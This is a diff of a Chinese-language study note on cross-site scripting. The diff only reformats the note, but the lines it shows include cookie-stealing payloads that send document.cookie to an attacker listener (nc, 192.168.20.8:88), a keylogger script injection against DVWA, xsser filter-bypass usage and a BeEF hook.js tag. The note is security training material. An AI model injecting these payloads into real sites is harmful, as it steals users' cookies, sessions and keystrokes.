@@ -1,14 +1,14 @@
 # XSS
 
 ## 0x01 xss简介
-+ 攻击对象: WEB客户端 
-+ 客户端脚本语言正常用途: 弹窗警告、广告,等
-+ 主要语言: JavaScript, 此外还有VBScript,ActiveX,or Flash
+- 攻击对象: WEB客户端 
+- 客户端脚本语言正常用途: 弹窗警告、广告,等
+- 主要语言: JavaScript, 此外还有VBScript,ActiveX,or Flash
 
 ### 漏洞形成的根源
-+ 服务器对用户提交数据过滤不严
-+ 提交给服务器的脚本被直接返回给其他客户端执行
-+ 脚本可以在客户端执行恶意操作
+- 服务器对用户提交数据过滤不严
+- 提交给服务器的脚本被直接返回给其他客户端执行
+- 脚本可以在客户端执行恶意操作
 
 ### XSS(cross-site scripting)主要利用方式
   - 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的
@@ -17,23 +17,23 @@
   - 重定向等等
 
 ### 攻击参与方 
-+ 攻击者
-+ 被攻击者
-+ 漏洞网站
-+ 可选: 第三方网站(可以是攻击者的肉鸡,或者攻击目标)
+- 攻击者
+- 被攻击者
+- 漏洞网站
+- 可选: 第三方网站(可以是攻击者的肉鸡,或者攻击目标)
 
 
 ### XSS漏洞类型
-+ 存储型（持久型）
-+ 反射型（非持久）
-+ DOM型(一种特殊的反射性,不过被攻击客户端不再去请求漏洞站点资源)
+- 存储型（持久型）
+- 反射型（非持久）
+- DOM型(一种特殊的反射性,不过被攻击客户端不再去请求漏洞站点资源)
 
 ## 0x02 JavaScript
 > 与Java语言无关                                 
 > 命名完全出于市场原因                           
 > 使用最广的客户端脚本语言                       
-+ 使用场景                                           
-``` JavaScript
+- 使用场景                                           
+```javascript
 直接嵌入html:<script>aler('XSS');</script>     
 元素标签事件: <body onload=alert('XSS')>       
 图片标签: <img src="javascript:alert('XSS');"> 
@@ -61,7 +61,7 @@ DOM对象，篡改页面内容
 ```
 
 ### 盗取Cookie举例
-```
+```bash
 ip2: nc -vnlp 88
 <script src=http://ip1/a.js></script>
 ip1上a.js源码
@@ -99,25 +99,25 @@ Echo "Hello Wolrd"
 注意, keylog.txt www-data要有写入权限.
 
 插入代码:
-```
+```html
 <script+src="http://ip/keylogger.js"></script>
 或
 <a href="http://IP1/dvwa/vulnerabilities/xss_r/?name=<script +src='http://IP2/keylogger.js'></script>">xss</a>
 ```
 
 ### Xss过滤
-+ 过滤关键字(形同虚设)
-+ 编码html字符(htmlspecialchars($message)函数把<  > 变` &lt;  &gt;`等)
+- 过滤关键字(形同虚设)
+- 编码html字符(htmlspecialchars($message)函数把<  > 变` &lt;  &gt;`等)
 > 这种情况下,如果输出点本身在尖括号内才可以较好利用(利用现有的尖括号),或者尝试编码绕过.
 
 ### 存储型xss 
 > 漏洞成因
-```
+```text
 应用把用户的输入内容存储到服务器端,每次访问都会调用执行JavaScript脚本.一般出现在类似留言处等可能存储到数据库的输入点.
 ```
 
 ### DOM型xss
-+ DOM, 一套js和其他语言可调用的标准api
+- DOM, 一套js和其他语言可调用的标准api
 
 ![](../../assets/010/20180221-196993d1.png)  
 
@@ -138,7 +138,7 @@ document.getElementById("p1").innerHTML="New text!";
 </html>
 ```
 DOM型xss 举例
-```
+```bash
 nc -nvlp 88
 
 <script>var img=document.createElement("img");img.src="http://192.168.20.8:88/log?"+escape(document.cookie);</script>
@@ -147,13 +147,13 @@ nc -nvlp 88
 
 ## 0x04 xss检测工具 `xsser`
  ### 简介
-+ 命令/图形化 工具
-+ 绕过服务器端输入筛选
-+ 10进制/16进制 等编码 
-+ unescape()
+- 命令/图形化 工具
+- 绕过服务器端输入筛选
+- 10进制/16进制 等编码 
+- unescape()
 
 ### 使用说明
-```
+```bash
 xsser -u http://1.1.1.1/dvwa/vulnerabilities/" -g "xss_r/?name=" --cookie="security=low;PHPSESSID=d23e439411707ff8210717e67c521a81" -s -v --reverse-check --heuristic 
 
 -g GET方法提交数据
@@ -162,8 +162,8 @@ xsser -u http://1.1.1.1/dvwa/vulnerabilities/" -g "xss_r/?name=" --cookie="secur
 --heuristic 检查具体过滤的漏洞
 ```
 
-```
-XSS 对payload编码，绕过服务器端筛选过滤 
+```text
+XSS 对payload编码，绕过服务器端筛选过滤
 --Str Use method String.FromCharCode()
 --Une Use Unescape() function
 --Mix Mix String.FromCharCode() and Unescape()
@@ -193,7 +193,7 @@ XSS 对payload编码，绕过服务器端筛选过滤
 --B64 Base64 code encoding in META tag (rfc2397) --Onm ONM - Use onMouseMove() event to inject code --Ifr Use <iframe> source tag to inject code
 ```
 
-```
+```text
 # xsser --help
 Usage: 
 
@@ -359,22 +359,22 @@ Options:
 
 ## 0x05 XSS漏洞利用工具 BEEF
 ### 简介
-+ 浏览器攻击面
+- 浏览器攻击面
 > 应用普遍转移到B/S架构，浏览器成为统一客户端程序,可以结合社会工程学方法对浏览器进行攻击,通过注入的JS脚本，攻击浏览器用户, 利用浏览器攻击其他网站 
-+ BEFF(Brower Exploitation Framework)
+- BEFF(Brower Exploitation Framework)
 > Ruby语言编写,可以生成、交付palyload
-> +  服务器端：管理hooked客户端
-> + 客户端：运行与客户端浏览器的Javascript脚本(hook)
+> -  服务器端：管理hooked客户端
+> - 客户端：运行与客户端浏览器的Javascript脚本(hook)
 
-+ 攻击手段
+- 攻击手段
 > 诱使客户端访问含有hook的伪造站点,利用网站xss漏洞实现攻击, 或可以结合中介人攻击注入hook脚本
 
-+ 常见用途 
-> + 键盘记录器
-> + 网络扫描
-> + 浏览器信息收集
-> + 绑定shell
-> + 与metasploit集成
+- 常见用途 
+> - 键盘记录器
+> - 网络扫描
+> - 浏览器信息收集
+> - 绑定shell
+> - 与metasploit集成
 
 
 ### 使用方法
@@ -382,17 +382,17 @@ Options:
 > 控制台或应用菜单启动 `beef-xss` ,之后访问 `http://127.0.0.1:3000/ui/panel`, 输入用户名密码均为 `beef`, 即可进入管理界面.
 
 #### 功能菜单简介
-+ Details
+- Details
 > 浏览器、插件版本信息；操作系统信息
 
-+ Logs
+- Logs
 > 浏览器工作：焦点变化、鼠标点击、信息输入
 
-+ Commands：命令模块
-> + 绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见
-> + 红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行
-> + 橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）
-> + 灰色模块：模块末在目标浏览器上测试过
+- Commands：命令模块
+> - 绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见
+> - 红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行
+> - 橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）
+> - 灰色模块：模块末在目标浏览器上测试过
 > **注意**: 上述不是百分百的准确,可用不可用,依据情况定.
 > 
 > 主要模块
@@ -402,7 +402,7 @@ Options:
 > Host
 > Network
 
-+ Hook示例
+- Hook示例
 ```
 <script src="http://<IP>:3000/hook.js"></script>
 ```
